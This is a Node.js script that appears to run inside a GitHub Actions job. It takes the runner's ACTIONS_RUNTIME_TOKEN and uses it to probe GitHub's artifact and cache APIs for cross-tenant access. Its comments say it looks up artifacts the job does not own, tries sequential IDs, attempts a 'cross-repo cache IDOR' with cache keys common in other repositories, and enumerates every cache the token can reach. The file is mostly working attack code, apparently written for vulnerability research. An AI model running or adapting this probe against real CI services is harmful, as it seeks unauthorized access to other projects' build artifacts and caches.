const https = require('https');
const fs = require('fs');

const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';
const ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

const outputFile = process.env.GITHUB_OUTPUT || '';
if (outputFile) {
  fs.appendFileSync(outputFile, `RESULTS_URL=${RESULTS_URL}\n`);
  fs.appendFileSync(outputFile, `CACHE_URL=${CACHE_URL}\n`);
  fs.appendFileSync(outputFile, `TOKEN_PRESENT=${RUNTIME_TOKEN ? 'YES' : 'NO'}\n`);
  fs.appendFileSync(outputFile, `ORCH_ID=${ORCHESTRATION_ID}\n`);
}

console.log('RESULTS_URL:', RESULTS_URL || '(empty)');
console.log('CACHE_URL:', CACHE_URL ? CACHE_URL.substring(0, 80) : '(empty)');
console.log('TOKEN_PRESENT:', RUNTIME_TOKEN ? 'YES' : 'NO');
console.log('ORCH_ID:', ORCHESTRATION_ID || '(empty)');

function doRequest(options, body) {
  return new Promise((resolve) => {
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, body: data.substring(0, 800) }));
    });
    req.on('error', (e) => resolve({ status: 'ERROR', body: e.message }));
    if (body) req.write(body);
    req.end();
  });
}

async function main() {
  const orchestrationUUID = ORCHESTRATION_ID.split('.')[0];
  console.log('Orchestration UUID:', orchestrationUUID);

  if (RESULTS_URL && RUNTIME_TOKEN) {
    const host = new URL(RESULTS_URL).hostname;
    const path = '/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts';

    // Test 1: With orchestration UUID as workflowRunBackendId
    const r1 = await doRequest({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, JSON.stringify({ workflowRunBackendId: orchestrationUUID }));
    console.log('=== ListArtifacts with orch UUID ===');
    console.log('Status:', r1.status, '| Body:', r1.body);

    // Test 2: Empty body — should return all artifacts accessible to token
    const r2 = await doRequest({
      hostname: host, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, '{}');
    console.log('=== ListArtifacts empty body ===');
    console.log('Status:', r2.status, '| Body:', r2.body);

    // Test 3: Try GetSignedArtifactURL for an artifact we DON'T own
    // GitHub artifact IDs are sequential — try IDs near our own
    const r3 = await doRequest({
      hostname: host,
      path: '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL',
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Content-Type': 'application/json' }
    }, JSON.stringify({ workflowRunBackendId: orchestrationUUID, name: 'probe-artifact-2' }));
    console.log('=== GetSignedArtifactURL for our artifact ===');
    console.log('Status:', r3.status, '| Body:', r3.body);
  }

  // Test 4: CRITICAL — Cross-repo cache IDOR via CACHE_URL
  if (CACHE_URL && RUNTIME_TOKEN) {
    const cacheHost = new URL(CACHE_URL).hostname;
    const cacheBase = new URL(CACHE_URL).pathname;

    // Try getting cache with keys that other repos commonly use
    const r4 = await doRequest({
      hostname: cacheHost,
      path: cacheBase + '_apis/artifactcache/cache?keys=node-cache&version=main',
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Accept': 'application/json;api-version=6.0-preview' }
    }, null);
    console.log('=== Cache cross-repo lookup (node-cache key) ===');
    console.log('Status:', r4.status, '| Body:', r4.body);

    // Test 5: Try listing OUR repo cache entries to understand response structure
    const r5 = await doRequest({
      hostname: cacheHost,
      path: cacheBase + '_apis/artifactcache/caches',
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + RUNTIME_TOKEN, 'Accept': 'application/json;api-version=6.0-preview' }
    }, null);
    console.log('=== Cache list (enumerate all accessible) ===');
    console.log('Status:', r5.status, '| Body:', r5.body);
  }
}

main().catch(e => console.log('Fatal error:', e.message));
